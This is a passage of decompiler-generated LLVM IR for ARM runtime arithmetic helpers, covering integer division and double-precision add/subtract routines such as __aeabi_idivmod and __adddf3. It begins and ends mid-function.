  %v2_1ec5c = and i32 %v0_1ec68.pr40, 268435456
  %v3_1ec5c = icmp eq i32 %v2_1ec5c, 0
  %v4_1ec5c = mul i32 %v0_1ec68.pr40, 16
  br i1 %v3_1ec5c, label %bb89, label %dec_label_pc_1ec68.loopexit

bb89:                                             ; preds = %bb88
  %v2_1ec60 = and i32 %v1_1ec60, 268435456
  %v3_1ec60 = icmp eq i32 %v2_1ec60, 0
  %v4_1ec60 = mul i32 %v1_1ec60, 16
  br i1 %v3_1ec60, label %.preheader, label %dec_label_pc_1ec68thread-pre-split.loopexit.loopexit

dec_label_pc_1ec68thread-pre-split.loopexit.loopexit: ; preds = %bb89, %bb87
  %v1_1ec7452.ph = phi i32 [ %v1_1ec60, %bb87 ], [ %v4_1ec60, %bb89 ]
  %v0_1ec68.pr42.ph = phi i32 [ %v0_1ec68.pr40, %bb87 ], [ %v4_1ec5c, %bb89 ]
  br label %dec_label_pc_1ec68thread-pre-split.loopexit

dec_label_pc_1ec68thread-pre-split.loopexit:      ; preds = %dec_label_pc_1ec68thread-pre-split.loopexit.loopexit, %.thread3
  %v1_1ec7452 = phi i32 [ %v1_1ec60, %.thread3 ], [ %v1_1ec7452.ph, %dec_label_pc_1ec68thread-pre-split.loopexit.loopexit ]
  %v0_1ec68.pr42 = phi i32 [ %v0_1ec68.pr40, %.thread3 ], [ %v0_1ec68.pr42.ph, %dec_label_pc_1ec68thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_1ec68thread-pre-split

dec_label_pc_1ec68thread-pre-split:               ; preds = %dec_label_pc_1ec68thread-pre-split.loopexit, %bb91
  %v1_1ec7450 = phi i32 [ %v1_1ec7452, %dec_label_pc_1ec68thread-pre-split.loopexit ], [ %v3_1ec74, %bb91 ]
  %v2_1ec6c48 = phi i32 [ %v0_1ed20, %dec_label_pc_1ec68thread-pre-split.loopexit ], [ %v2_1ec6c, %bb91 ]
  %v0_1ec68.pr = phi i32 [ %v0_1ec68.pr42, %dec_label_pc_1ec68thread-pre-split.loopexit ], [ %v3_1ec70, %bb91 ]
  br label %dec_label_pc_1ec68

dec_label_pc_1ec68.loopexit:                      ; preds = %bb88
  br label %dec_label_pc_1ec68

dec_label_pc_1ec68:                               ; preds = %dec_label_pc_1ec68.loopexit, %dec_label_pc_1ec68thread-pre-split
  %v1_1ec74 = phi i32 [ %v1_1ec7450, %dec_label_pc_1ec68thread-pre-split ], [ %v1_1ec60, %dec_label_pc_1ec68.loopexit ]
  %v2_1ec6c = phi i32 [ %v2_1ec6c48, %dec_label_pc_1ec68thread-pre-split ], [ %v0_1ed20, %dec_label_pc_1ec68.loopexit ]
  %v1_1ec70 = phi i32 [ %v0_1ec68.pr, %dec_label_pc_1ec68thread-pre-split ], [ %v4_1ec5c, %dec_label_pc_1ec68.loopexit ]
  %v2_1ec68 = icmp slt i32 %v1_1ec70, 0
  br i1 %v2_1ec68, label %dec_label_pc_1ec7c, label %bb90

bb90:                                             ; preds = %dec_label_pc_1ec68
  %v4_1ec6c = icmp ult i32 %v1_1ec70, %v2_1ec6c
  br i1 %v4_1ec6c, label %bb91, label %dec_label_pc_1ec7c

bb91:                                             ; preds = %bb90
  %v3_1ec70 = mul i32 %v1_1ec70, 2
  %v2_1ec74 = icmp slt i32 %v1_1ec74, 0
  %v3_1ec74 = mul i32 %v1_1ec74, 2
  br i1 %v2_1ec74, label %dec_label_pc_1ec7c, label %dec_label_pc_1ec68thread-pre-split

dec_label_pc_1ec7c:                               ; preds = %bb90, %dec_label_pc_1ec68, %bb91
  %v2_1ec8863 = phi i32 [ %v3_1ec74, %bb91 ], [ %v1_1ec74, %bb90 ], [ %v1_1ec74, %dec_label_pc_1ec68 ]
  %v1_1ec8055 = phi i32 [ %v3_1ec70, %bb91 ], [ %v1_1ec70, %bb90 ], [ %v1_1ec70, %dec_label_pc_1ec68 ]
  br label %dec_label_pc_1ec80

dec_label_pc_1ec80:                               ; preds = %.thread13, %dec_label_pc_1ec7c
  %v1_1ecb4 = phi i32 [ %v4_1ecb4, %.thread13 ], [ %v2_1ec8863, %dec_label_pc_1ec7c ]
  %v1_1ec88 = phi i32 [ %v1_1ecc4, %.thread13 ], [ 0, %dec_label_pc_1ec7c ]
  %v1_1ecb8 = phi i32 [ %v4_1ecb8, %.thread13 ], [ %v1_1ec8055, %dec_label_pc_1ec7c ]
  %v1_1ec84 = phi i32 [ %v0_1ecb0, %.thread13 ], [ %v0_1ed20, %dec_label_pc_1ec7c ]
  %v3_1ec80 = icmp ult i32 %v1_1ec84, %v1_1ecb8
  br i1 %v3_1ec80, label %.thread8, label %bb92

bb92:                                             ; preds = %dec_label_pc_1ec80
  %v3_1ec84 = sub i32 %v1_1ec84, %v1_1ecb8
  %v3_1ec88 = or i32 %v1_1ec88, %v1_1ecb4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1ec80, %bb92
  %v1_1ec90 = phi i32 [ %v1_1ec84, %dec_label_pc_1ec80 ], [ %v3_1ec84, %bb92 ]
  %v1_1ec94 = phi i32 [ %v1_1ec88, %dec_label_pc_1ec80 ], [ %v3_1ec88, %bb92 ]
  %v4_1ec8c = udiv i32 %v1_1ecb8, 2
  %v6_1ec8c = icmp ult i32 %v1_1ec90, %v4_1ec8c
  br i1 %v6_1ec8c, label %.thread9, label %bb93

bb93:                                             ; preds = %.thread8
  %v3_1ec90 = urem i32 %v1_1ecb8, 2
  %v4_1ec90 = icmp eq i32 %v3_1ec90, 0
  %v6_1ec90 = sub i32 %v1_1ec90, %v4_1ec8c
  br i1 %v4_1ec90, label %.thread9, label %bb94

bb94:                                             ; preds = %bb93
  %v5_1ec94 = udiv i32 %v1_1ecb4, 2
  %v6_1ec94 = or i32 %v1_1ec94, %v5_1ec94
  br label %.thread9

.thread9:                                         ; preds = %bb93, %.thread8, %bb94
  %v1_1ec9c = phi i32 [ %v6_1ec90, %bb93 ], [ %v1_1ec90, %.thread8 ], [ %v6_1ec90, %bb94 ]
  %v1_1eca0 = phi i32 [ %v1_1ec94, %bb93 ], [ %v1_1ec94, %.thread8 ], [ %v6_1ec94, %bb94 ]
  %v4_1ec98 = udiv i32 %v1_1ecb8, 4
  %v6_1ec98 = icmp ult i32 %v1_1ec9c, %v4_1ec98
  br i1 %v6_1ec98, label %.thread10, label %bb95

bb95:                                             ; preds = %.thread9
  %v3_1ec9c = and i32 %v1_1ecb8, 2
  %v4_1ec9c = icmp eq i32 %v3_1ec9c, 0
  %v6_1ec9c = sub i32 %v1_1ec9c, %v4_1ec98
  br i1 %v4_1ec9c, label %.thread10, label %bb96

bb96:                                             ; preds = %bb95
  %v5_1eca0 = udiv i32 %v1_1ecb4, 4
  %v6_1eca0 = or i32 %v1_1eca0, %v5_1eca0
  br label %.thread10

.thread10:                                        ; preds = %bb95, %.thread9, %bb96
  %v1_1eca8 = phi i32 [ %v6_1ec9c, %bb95 ], [ %v1_1ec9c, %.thread9 ], [ %v6_1ec9c, %bb96 ]
  %v1_1ecac = phi i32 [ %v1_1eca0, %bb95 ], [ %v1_1eca0, %.thread9 ], [ %v6_1eca0, %bb96 ]
  %v4_1eca4 = udiv i32 %v1_1ecb8, 8
  %v6_1eca4 = icmp ult i32 %v1_1eca8, %v4_1eca4
  br i1 %v6_1eca4, label %thread-pre-split12, label %bb97

bb97:                                             ; preds = %.thread10
  %v3_1eca8 = and i32 %v1_1ecb8, 4
  %v4_1eca8 = icmp eq i32 %v3_1eca8, 0
  %v6_1eca8 = sub i32 %v1_1eca8, %v4_1eca4
  br i1 %v4_1eca8, label %thread-pre-split12, label %bb98

bb98:                                             ; preds = %bb97
  %v5_1ecac = udiv i32 %v1_1ecb4, 8
  %v6_1ecac = or i32 %v1_1ecac, %v5_1ecac
  br label %thread-pre-split12

thread-pre-split12:                               ; preds = %bb98, %.thread10, %bb97
  %v1_1ecc4 = phi i32 [ %v1_1ecac, %bb97 ], [ %v1_1ecac, %.thread10 ], [ %v6_1ecac, %bb98 ]
  %v0_1ecb0 = phi i32 [ %v6_1eca8, %bb97 ], [ %v1_1eca8, %.thread10 ], [ %v6_1eca8, %bb98 ]
  %v2_1ecb0 = icmp eq i32 %v0_1ecb0, 0
  br i1 %v2_1ecb0, label %dec_label_pc_1ecc0, label %bb99

bb99:                                             ; preds = %thread-pre-split12
  %tmp = icmp ult i32 %v1_1ecb4, 16
  br i1 %tmp, label %dec_label_pc_1ecc0, label %.thread13

.thread13:                                        ; preds = %bb99
  %v4_1ecb4 = udiv i32 %v1_1ecb4, 16
  %v4_1ecb8 = udiv i32 %v1_1ecb8, 16
  br label %dec_label_pc_1ec80

dec_label_pc_1ecc0:                               ; preds = %thread-pre-split12, %bb99
  %v1_1ecc0 = icmp slt i32 %v2_1ec18, 0
  br i1 %v1_1ecc0, label %bb100, label %.thread16

bb100:                                            ; preds = %dec_label_pc_1ecc0
  %v2_1ecc4 = sub i32 0, %v1_1ecc4
  br label %.thread16

.thread16:                                        ; preds = %bb104, %bb103, %bb101, %dec_label_pc_1eccc, %dec_label_pc_1ecc0, %bb100
  %v1_1ecc8 = phi i32 [ %v1_1ecc4, %dec_label_pc_1ecc0 ], [ %v2_1ecc4, %bb100 ], [ %arg1, %dec_label_pc_1eccc ], [ %v2_1ecd0, %bb101 ], [ %v1_1ece480, %bb103 ], [ %v2_1ece0, %bb104 ]
  ret i32 %v1_1ecc8

dec_label_pc_1eccc:                               ; preds = %thread-pre-split
  br i1 %v1_1ec14, label %bb101, label %.thread16

bb101:                                            ; preds = %dec_label_pc_1eccc
  %v2_1ecd0 = sub i32 0, %arg1
  br label %.thread16

dec_label_pc_1ecd8:                               ; preds = %bb86
  br i1 %v3_1ec34, label %bb103, label %bb102

bb102:                                            ; preds = %dec_label_pc_1ecd8
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_1ecd8, %bb102
  %v1_1ece480 = phi i32 [ %arg1, %dec_label_pc_1ecd8 ], [ 0, %bb102 ]
  br i1 %v9_1ec34, label %bb104, label %.thread16

bb104:                                            ; preds = %bb103
  %v4_1ecdc = ashr i32 %v2_1ec18, 31
  %v2_1ece0 = or i32 %v4_1ecdc, 1
  br label %.thread16

dec_label_pc_1ece8:                               ; preds = %dec_label_pc_1ec3c
  %v2_1ece8 = icmp ugt i32 %v1_1ecec, 65535
  br i1 %v2_1ece8, label %bb105, label %.thread19

bb105:                                            ; preds = %dec_label_pc_1ece8
  %v2_1ecec = and i32 %v1_1ecec, 32768
  %v3_1ecec = icmp eq i32 %v2_1ecec, 0
  %v4_1ecec = udiv i32 %v1_1ecec, 65536
  br i1 %v3_1ecec, label %.thread19, label %bb106

.thread19:                                        ; preds = %bb105, %dec_label_pc_1ece8
  %v0_1ecf870 = phi i32 [ %v1_1ecec, %dec_label_pc_1ece8 ], [ %v4_1ecec, %bb105 ]
  br label %bb106

bb106:                                            ; preds = %bb105, %.thread19
  %v1_1ecfc = phi i32 [ %v0_1ecf870, %.thread19 ], [ %v4_1ecec, %bb105 ]
  %storemerge = phi i32 [ 0, %.thread19 ], [ 16, %bb105 ]
  %v2_1ecf8 = icmp ugt i32 %v1_1ecfc, 255
  br i1 %v2_1ecf8, label %bb107, label %.thread20

bb107:                                            ; preds = %bb106
  %v2_1ecfc = and i32 %v1_1ecfc, 128
  %v3_1ecfc = icmp eq i32 %v2_1ecfc, 0
  %v4_1ecfc = udiv i32 %v1_1ecfc, 256
  br i1 %v3_1ecfc, label %.thread20, label %bb108

bb108:                                            ; preds = %bb107
  %v2_1ed00 = or i32 %storemerge, 8
  br label %.thread20

.thread20:                                        ; preds = %bb107, %bb106, %bb108
  %v1_1ed0c = phi i32 [ %storemerge, %bb106 ], [ %storemerge, %bb107 ], [ %v2_1ed00, %bb108 ]
  %v1_1ed08 = phi i32 [ %v1_1ecfc, %bb106 ], [ %v4_1ecfc, %bb107 ], [ %v4_1ecfc, %bb108 ]
  %v2_1ed04 = icmp ugt i32 %v1_1ed08, 15
  br i1 %v2_1ed04, label %bb109, label %.thread21

bb109:                                            ; preds = %.thread20
  %v2_1ed08 = and i32 %v1_1ed08, 8
  %v3_1ed08 = icmp eq i32 %v2_1ed08, 0
  %v4_1ed08 = udiv i32 %v1_1ed08, 16
  br i1 %v3_1ed08, label %.thread21, label %bb110

bb110:                                            ; preds = %bb109
  %v2_1ed0c = add nsw i32 %v1_1ed0c, 4
  br label %.thread21

.thread21:                                        ; preds = %bb109, %.thread20, %bb110
  %v4_1ed14 = phi i32 [ %v1_1ed0c, %.thread20 ], [ %v1_1ed0c, %bb109 ], [ %v2_1ed0c, %bb110 ]
  %v5_1ed18 = phi i32 [ %v1_1ed08, %.thread20 ], [ %v4_1ed08, %bb109 ], [ %v4_1ed08, %bb110 ]
  %v2_1ed10 = icmp ugt i32 %v5_1ed18, 3
  %v7_1ed10 = icmp eq i32 %v5_1ed18, 4
  %v2_1ed14 = xor i1 %v7_1ed10, true
  %v3_1ed14 = and i1 %v2_1ed10, %v2_1ed14
  br i1 %v3_1ed14, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1ed14 = add nsw i32 %v4_1ed14, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1ed18 = phi i32 [ %v4_1ed14, %.thread21 ], [ %v5_1ed14, %bb111 ]
  %v2_1ed18 = xor i1 %v2_1ed10, true
  %v3_1ed18 = or i1 %v7_1ed10, %v2_1ed18
  br i1 %v3_1ed18, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1ed18 = udiv i32 %v5_1ed18, 2
  %v9_1ed18 = add i32 %v4_1ed18, %v8_1ed18
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1ed20 = phi i32 [ %v4_1ed18, %bb112 ], [ %v9_1ed18, %bb113 ]
  %v1_1ed1c = icmp slt i32 %v2_1ec18, 0
  %v6_1ed20 = lshr i32 %v0_1ed20, %v1_1ed20
  %v2_1ed24 = sub i32 0, %v6_1ed20
  %v2_1ed24.v6_1ed20 = select i1 %v1_1ed1c, i32 %v2_1ed24, i32 %v6_1ed20
  ret i32 %v2_1ed24.v6_1ed20

dec_label_pc_1ed2c:                               ; preds = %entry
  %v0_1ed30 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1ed18, { 1, 0 }
  uselistorder i1 %v7_1ed10, { 1, 0 }
  uselistorder i32 %v4_1ed08, { 1, 0 }
  uselistorder i32 %v1_1ed08, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ecfc, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1ecfc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1ecec, { 1, 0 }
  uselistorder i32 %v0_1ecb0, { 1, 0 }
  uselistorder i32 %v4_1eca4, { 1, 0 }
  uselistorder i32 %v1_1ecac, { 1, 2, 0 }
  uselistorder i32 %v4_1ec98, { 1, 0 }
  uselistorder i32 %v1_1eca0, { 1, 2, 0 }
  uselistorder i32 %v4_1ec8c, { 1, 0 }
  uselistorder i32 %v1_1ec94, { 1, 2, 0 }
  uselistorder i32 %v1_1ecb8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1ec88, { 1, 0 }
  uselistorder i32 %v1_1ecb4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1ec74, { 1, 0 }
  uselistorder i32 %v3_1ec70, { 1, 0 }
  uselistorder i32 %v1_1ec70, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1ec6c, { 1, 0 }
  uselistorder i32 %v1_1ec74, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1ec60, { 1, 0 }
  uselistorder i32 %v4_1ec5c, { 2, 1, 0 }
  uselistorder i32 %v1_1ec60, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1ec68.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1ec34, { 1, 0 }
  uselistorder i32 %v1_1ecec, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1ec18, { 1, 0, 2 }
  uselistorder i32 %v0_1ec14, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1ecc0, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1ec7c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1ec68thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1ed44 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1ed44
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1ed5c = bitcast i64 %tmp to double
  %v9_1ed5c = fadd double %v8_1ed5c, %arg1
  %v10_1ed5c = fptrunc double %v9_1ed5c to float
  %v11_1ed5c = bitcast float %v10_1ed5c to i32
  ret i32 %v11_1ed5c
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1ed60 = load i32, i32* @r0, align 4
  ret i32 %v2_1ed60
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1ed64 = load i32, i32* @r4, align 4
  store i32 %v3_1ed64, i32* %stack_var_-12, align 4
  %v6_1ed64 = load i32, i32* @r5, align 4
  %v9_1ed64 = load i32, i32* @lr, align 4
  %v0_1ed68 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ed68 = mul i32 %v0_1ed68, 2
  store i32 %v2_1ed68, i32* %r4.global-to-local, align 4
  %v0_1ed6c = load i32, i32* %r3.global-to-local, align 4
  %v2_1ed6c = mul i32 %v0_1ed6c, 2
  store i32 %v2_1ed6c, i32* %r5.global-to-local, align 4
  %v4_1ed70 = icmp eq i32 %v2_1ed6c, %v2_1ed68
  %v1_1ed74 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1ed70, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1ed74 = load i32, i32* %r2.global-to-local, align 4
  %v5_1ed74 = icmp eq i32 %v2_1ed74, %v1_1ed74
  br i1 %v5_1ed74, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1ed78 = or i32 %v1_1ed74, %v2_1ed68
  %v5_1ed78 = icmp eq i32 %v3_1ed78, 0
  br i1 %v5_1ed78, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1ed7c = load i32, i32* %r2.global-to-local, align 4
  %v3_1ed7c = or i32 %v2_1ed7c, %v2_1ed6c
  %v5_1ed7c = icmp eq i32 %v3_1ed7c, 0
  br i1 %v5_1ed7c, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1ed68.off = add i32 %v2_1ed68, 4194303
  %tmp = icmp ult i32 %v2_1ed68.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1ed6c.off = add i32 %v2_1ed6c, 4194303
  %tmp17 = icmp ult i32 %v2_1ed6c.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1ed88 = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1ed88, i32 ptrtoint (i32* @global_var_1efc0.1719 to i32))
  %v0_1ed8c = load i32, i32* %r4.global-to-local, align 4
  %v3_1ed8c = udiv i32 %v0_1ed8c, 2097152
  store i32 %v3_1ed8c, i32* %r4.global-to-local, align 4
  %v1_1ed90 = load i32, i32* %r5.global-to-local, align 4
  %v4_1ed90 = udiv i32 %v1_1ed90, 2097152
  %v5_1ed90 = sub nsw i32 %v4_1ed90, %v3_1ed8c
  %v5_1ed94 = icmp ult i32 %v4_1ed90, %v3_1ed8c
  br i1 %v5_1ed94, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1ed94 = sub nsw i32 0, %v5_1ed90
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1ed94, %bb13 ], [ %v5_1ed90, %.thread3 ]
  %v0_1edb8 = phi i32 [ %v7_1ed94, %bb13 ], [ %v5_1ed90, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1ed98 = icmp ugt i32 %v4_1ed90, %v3_1ed8c
  br i1 %v7_1ed98, label %dec_label_pc_1ed9c, label %dec_label_pc_1edb8

dec_label_pc_1ed9c:                               ; preds = %bb14
  %v2_1ed9c = add nsw i32 %v0_1edb8, %v3_1ed8c
  store i32 %v2_1ed9c, i32* %r4.global-to-local, align 4
  %v0_1eda0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1eda0 = load i32, i32* %r2.global-to-local, align 4
  %v0_1eda4 = load i32, i32* %r1.global-to-local, align 4
  %v1_1eda4 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1eda0, i32* %r0.global-to-local, align 4
  store i32 %v1_1eda4, i32* %r1.global-to-local, align 4
  store i32 %v0_1eda0, i32* %r2.global-to-local, align 4
  store i32 %v0_1eda4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1edb8

dec_label_pc_1edb8:                               ; preds = %bb14, %dec_label_pc_1ed9c
  %tmp18 = icmp ugt i32 %v0_1edb8, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1edb8
  %v6_1edbc = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1edbc, i32* %r4.global-to-local, align 4
  store i32 %v6_1ed64, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1edb8, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1ed64)
  %v0_1edc4 = load i32, i32* %r1.global-to-local, align 4
  %v3_1edc4 = icmp sgt i32 %v0_1edc4, -1
  %v4_1edd0 = urem i32 %v0_1edc4, 1048576
  %v5_1edd0 = or i32 %v4_1edd0, 1048576
  store i32 %v5_1edd0, i32* %r1.global-to-local, align 4
  br i1 %v3_1edc4, label %dec_label_pc_1ede0, label %dec_label_pc_1edd8

dec_label_pc_1edd8:                               ; preds = %bb16
  %v0_1edd8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1edd8 = sub i32 0, %v0_1edd8
  store i32 %v1_1edd8, i32* %r0.global-to-local, align 4
  %v2_1edd8 = icmp eq i32 %v0_1edd8, 0
  %v2_1eddc = icmp eq i1 %v2_1edd8, false
  %v5_1eddc = sext i1 %v2_1eddc to i32
  %v6_1eddc = sub nsw i32 %v5_1eddc, %v5_1edd0
  store i32 %v6_1eddc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1ede0

dec_label_pc_1ede0:                               ; preds = %bb16, %dec_label_pc_1edd8
  %v0_1ede0 = load i32, i32* %r3.global-to-local, align 4
  %v3_1ede0 = icmp sgt i32 %v0_1ede0, -1
  %v4_1ede8 = urem i32 %v0_1ede0, 1048576
  %v5_1ede8 = or i32 %v4_1ede8, 1048576
  store i32 %v5_1ede8, i32* %r3.global-to-local, align 4
  br i1 %v3_1ede0, label %dec_label_pc_1edf8, label %dec_label_pc_1edf0

dec_label_pc_1edf0:                               ; preds = %dec_label_pc_1ede0
  %v0_1edf0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1edf0 = sub i32 0, %v0_1edf0
  store i32 %v1_1edf0, i32* %r2.global-to-local, align 4
  %v2_1edf0 = icmp eq i32 %v0_1edf0, 0
  %v2_1edf4 = icmp eq i1 %v2_1edf0, false
  %v5_1edf4 = sext i1 %v2_1edf4 to i32
  %v6_1edf4 = sub nsw i32 %v5_1edf4, %v5_1ede8
  store i32 %v6_1edf4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1edf8

dec_label_pc_1edf8:                               ; preds = %dec_label_pc_1ede0, %dec_label_pc_1edf0
  %v0_1edf8 = load i32, i32* %r4.global-to-local, align 4
  %v1_1edf8 = load i32, i32* %r5.global-to-local, align 4
  %v4_1edf8 = icmp eq i32 %v1_1edf8, %v0_1edf8
  call void @__pseudo_cond_branch(i1 %v4_1edf8, i32 ptrtoint (i32* @global_var_1efa8.1720 to i32))
  %v1_1edfc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1edfc

; uselistorder directives
  uselistorder i32 %v0_1ede0, { 1, 0 }
  uselistorder i32 %v0_1edc4, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1ed90, { 2, 1, 0 }
  uselistorder i32 %v3_1ed8c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1ed74, { 1, 0 }
  uselistorder i32 %v2_1ed6c, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1ed68, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1edf8, { 1, 0 }
  uselistorder label %dec_label_pc_1ede0, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1edb8, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1ee00() local_unnamed_addr {
dec_label_pc_1ee00:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1ee00 = load i32, i32* @r4, align 4
  %v1_1ee00 = add i32 %v0_1ee00, -1
  store i32 %v1_1ee00, i32* @r4, align 4
  %v0_1ee04 = load i32, i32* @r5, align 4
  %v1_1ee04 = sub i32 32, %v0_1ee04
  store i32 %v1_1ee04, i32* @lr, align 4
  %v5_1ee08 = icmp sgt i32 %v0_1ee04, 32
  br i1 %v5_1ee08, label %dec_label_pc_1ee24, label %dec_label_pc_1ee0c

dec_label_pc_1ee0c:                               ; preds = %dec_label_pc_1ee00
  %v0_1ee0c = load i32, i32* @r2, align 4
  %v6_1ee0c = shl i32 %v0_1ee0c, %v1_1ee04
  store i32 %v6_1ee0c, i32* %ip.global-to-local, align 4
  %v0_1ee10 = load i32, i32* @r0, align 4
  %v3_1ee10 = add i32 %v0_1ee04, -1
  %v4_1ee10 = shl i32 1, %v3_1ee10
  %v7_1ee10 = lshr i32 %v0_1ee0c, %v0_1ee04
  %v8_1ee10 = add i32 %v0_1ee10, %v7_1ee10
  %v9_1ee10 = icmp ult i32 %v8_1ee10, %v0_1ee10
  %v0_1ee14 = load i32, i32* @r1, align 4
  %v2_1ee14 = zext i1 %v9_1ee10 to i32
  %v3_1ee14 = add i32 %v2_1ee14, %v0_1ee14
  %v1_1ee18 = load i32, i32* @r3, align 4
  %v7_1ee18 = shl i32 %v1_1ee18, %v1_1ee04
  %v8_1ee18 = add i32 %v7_1ee18, %v8_1ee10
  store i32 %v8_1ee18, i32* %r0.global-to-local, align 4
  %v5_1ee1c = and i32 %v1_1ee18, %v4_1ee10
  %v6_1ee1c = icmp ne i32 %v5_1ee1c, 0
  %v7_1ee1c = ashr i32 %v1_1ee18, %v0_1ee04
  %v9_1ee1c = add i32 %v3_1ee14, %v7_1ee1c
  %v10_1ee1c = zext i1 %v6_1ee1c to i32
  %v11_1ee1c = add i32 %v10_1ee1c, %v9_1ee1c
  br label %dec_label_pc_1ee40

dec_label_pc_1ee24:                               ; preds = %dec_label_pc_1ee00
  %v1_1ee24 = add i32 %v0_1ee04, -32
  %v1_1ee28 = add i32 %v1_1ee04, 32
  store i32 %v1_1ee28, i32* @lr, align 4
  %v0_1ee30 = load i32, i32* @r3, align 4
  %v2_1ee30 = add i32 %v1_1ee04, 31
  %v3_1ee30 = lshr i32 -2147483648, %v2_1ee30
  %v4_1ee30 = and i32 %v0_1ee30, %v3_1ee30
